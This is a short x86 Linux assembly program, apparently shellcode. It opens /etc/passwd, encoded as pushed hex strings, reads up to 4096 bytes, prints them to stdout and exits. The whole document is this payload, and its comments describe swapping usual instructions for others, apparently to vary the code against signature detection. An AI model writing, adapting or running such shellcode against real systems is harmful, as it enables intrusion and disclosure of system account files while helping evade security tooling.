global _start
section .text

; zero out regs with sub instead of xor
; using push byte for syscall instead of mov al, id
_start:
	sub ecx,ecx
	mul ecx
	push byte 0x5
        pop eax
	push ecx
	push dword 0x64777373
	push dword 0x61702f63
	push dword 0x74652f2f
	mov ebx,esp
	int 0x80

	xchg eax,ebx
	xchg eax,ecx
	push byte 0x3 ; change syscall format
        pop eax
	mov dl , 1 ; zero out edx by adding 1 to it then decrememnt it 
	dec edx
	mov dx,0xfff
	inc edx
	int 0x80

	xchg eax,edx
	sub eax,eax
	push byte 0x4
	pop eax
	push byte 0x1
	pop ebx
	int 0x80

	xchg eax,ebx
	int 0x80

